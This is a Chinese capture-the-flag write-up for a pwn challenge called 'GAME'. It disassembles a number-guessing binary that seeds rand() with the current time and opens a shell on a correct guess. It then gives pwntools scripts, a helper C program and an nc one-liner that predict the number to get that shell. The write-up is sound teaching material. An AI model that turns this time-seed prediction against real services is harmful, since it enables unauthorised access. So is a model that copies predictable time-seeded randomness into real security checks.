# GAME

- 作者：pn1fg

- 参考：-

- 难度：Normal

- 分类：Pwn

- 暴露端口：70

## 题目描述

你可以预测未来嘛？

## 题目解析

- 源码：[game.c](build/game.c)
- 考点：随机数预测，pwntools的使用

#### 查看问件信息

查看文件类型（`file`命令）：

```shell
>>> file GAME
GAME: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9a14391da2604ebbffd3d7881f07cf0fa4bcf2e3, for GNU/Linux 3.2.0, not stripped
```

这是一个 64 位的 ELF 文件（`ELF 64-bit LSB executable`），动态链接（`dynamically linked`），没有去除符号（`not stripped`）

查看保护机制（`checksec`命令）：

```shell
>>> checksec --file=GAME
[*] '/home/pn1fg/文档/0xgame/GAME'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX 保护

#### 分析漏洞成因

反编译`main`函数：

```c
ulong main(void)

{
    uint uVar1;

    uVar1 = sym.imp.time(0);
    sym.imp.srand(uVar1);
    sym.init();
    sym.menu();
    sym.game();
    return 0;
}
```

前两行将当前时间作为随机函数的种子

查看`init`函数：

```c
void sym.init(void)

{
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stdin, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stderr, 0, 2, 0);
    return;
}
```

`init`函数中是程序初始化，清空缓存

查看`menu`函数：

```c
void sym.menu(void)

{
    sym.imp.puts(
                "********************************\n+****** 猜数字游戏(1~100) *****+\n********************************"
                );
    return;
}
```

输出语句没啥好说的

查看`game`函数：

```c
void sym.game(void)

{
    int32_t iVar1;
    int32_t var_8h;
    ulong var_4h;

    iVar1 = sym.imp.rand();
    var_4h._0_4_ = iVar1 % 999 + 1;
    sym.imp.puts("Please Input:");
    sym.imp.__isoc99_scanf(0x40207e, &var_8h);
    if (var_8h < var_4h) {
        sym.imp.puts("It\'s too small!");
    }
    else if (var_4h < var_8h) {
        sym.imp.puts("It\'s too big!");
    }
    else {
        sym.imp.system("/bin/sh");
    }
    return;
}
```

前两行生成 1～1000 之间的随机数，使用`scanf`接收一个数与随机数比较，相等了就可以执行`sym.imp.system("/bin/sh");`，这行语句相信大家都很熟悉，我们在**给新生的Pwn指南**中讲解过，执行它就可以获取到`shell`

它的汇编如下：

```c
[0x00401110]> pdf @ sym.game
            ; CALL XREF from main @ 0x401350(x)
┌ 169: sym.game ();
│           ; var signed int64_t var_4h @ rbp-0x4
│           ; var int64_t var_8h @ rbp-0x8
│           0x00401275      f30f1efa       endbr64
│           0x00401279      55             push rbp
│           0x0040127a      4889e5         mov rbp, rsp
│           0x0040127d      4883ec10       sub rsp, 0x10
│           0x00401281      e87afeffff     call sym.imp.rand           ; int rand(void)
│           0x00401286      4863d0         movsxd rdx, eax
│           0x00401289      4869d2210534.  imul rdx, rdx, 0xffffffff83340521
│           0x00401290      48c1ea20       shr rdx, 0x20
│           0x00401294      01c2           add edx, eax
│           0x00401296      c1fa09         sar edx, 9
│           0x00401299      89c1           mov ecx, eax
│           0x0040129b      c1f91f         sar ecx, 0x1f
│           0x0040129e      29ca           sub edx, ecx
│           0x004012a0      69cae7030000   imul ecx, edx, 0x3e7
│           0x004012a6      29c8           sub eax, ecx
│           0x004012a8      89c2           mov edx, eax
│           0x004012aa      8d4201         lea eax, [rdx + 1]
│           0x004012ad      8945fc         mov dword [var_4h], eax
│           0x004012b0      488d05b90d00.  lea rax, str.Please_Input:  ; 0x402070 ; "Please Input:"
│           0x004012b7      4889c7         mov rdi, rax                ; const char *s
│           0x004012ba      e8e1fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012bf      488d45f8       lea rax, [var_8h]
│           0x004012c3      4889c6         mov rsi, rax
│           0x004012c6      488d05b10d00.  lea rax, [0x0040207e]       ; "%d"
│           0x004012cd      4889c7         mov rdi, rax                ; const char *format
│           0x004012d0      b800000000     mov eax, 0
│           0x004012d5      e816feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x004012da      8b45f8         mov eax, dword [var_8h]
│           0x004012dd      3945fc         cmp dword [var_4h], eax
│       ┌─< 0x004012e0      7e11           jle 0x4012f3
│       │   0x004012e2      488d05980d00.  lea rax, str.Its_too_small_ ; 0x402081 ; "It's too small!"
│       │   0x004012e9      4889c7         mov rdi, rax                ; const char *s
│       │   0x004012ec      e8affdffff     call sym.imp.puts           ; int puts(const char *s)
│      ┌──< 0x004012f1      eb28           jmp 0x40131b
│      ││   ; CODE XREF from sym.game @ 0x4012e0(x)
│      │└─> 0x004012f3      8b45f8         mov eax, dword [var_8h]
│      │    0x004012f6      3945fc         cmp dword [var_4h], eax
│      │┌─< 0x004012f9      7d11           jge 0x40130c
│      ││   0x004012fb      488d058f0d00.  lea rax, str.Its_too_big_   ; 0x402091 ; "It's too big!"
│      ││   0x00401302      4889c7         mov rdi, rax                ; const char *s
│      ││   0x00401305      e896fdffff     call sym.imp.puts           ; int puts(const char *s)
│     ┌───< 0x0040130a      eb0f           jmp 0x40131b
│     │││   ; CODE XREF from sym.game @ 0x4012f9(x)
│     ││└─> 0x0040130c      488d058c0d00.  lea rax, str._bin_sh        ; 0x40209f ; "/bin/sh"
│     ││    0x00401313      4889c7         mov rdi, rax                ; const char *string
│     ││    0x00401316      e895fdffff     call sym.imp.system         ; int system(const char *string)
│     ││    ; CODE XREFS from sym.game @ 0x4012f1(x), 0x40130a(x)
│     └└──> 0x0040131b      90             nop
│           0x0040131c      c9             leave
└           0x0040131d      c3             ret
```

大家可以尝试着多读读汇编

分析到这，本题的大体思路就是以当前时间为随机数种子，预测随机数，绕过程序检查获取 shell

#### 编写利用程序

**常规解法：**（这里给两种写法，第一种比较正规，第二种会有失败的概率）

- [exp.py](writeup/exp.py)

```python
from pwn import *
from ctypes import cdll

context.arch = 'amd64'
context.log_level = 'debug'

if args['REMOTE']:
    io = remote('ip',port)
else:
    io = process('./GAME')

libc = cdll.LoadLibrary("libc.so.6")
libc.srand(libc.time(0))
number = libc.rand() % 999 + 1

io.sendlineafter(b'Input:\n',str(number).encode())
io.interactive()
```

- [exp1.py](writeup/exp1.py)

  - [random.c](writeup/random.c)

    ```c
    #include <stdio.h>
    #include <time.h>
    #include <stdlib.h>
    
    int main() {
      int a;
      srand(time(0));
      a = rand() % 999 + 1;
      printf("%d",a);
      return 0;
    }
    ```

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

if args['REMOTE']:
    io = remote('ip',port)
else:
    io = process('./GAME')

io.sendlineafter(b'Input:\n',os.popen('./random').read())
io.interactive()
```

这里是利用 python 和操作系统交互的方式，在运行 exp 的同时调用操作系统执行 C 程序，这样的缺点就是可能有时间误差，导致有些时候会打不通

**懒人解法：**

```shell
>>> ./random && nc ip port
```

这是在命令行同时执行运行和 nc 两个操作，这样的打概率可以确保它们的随机数种子是一致的

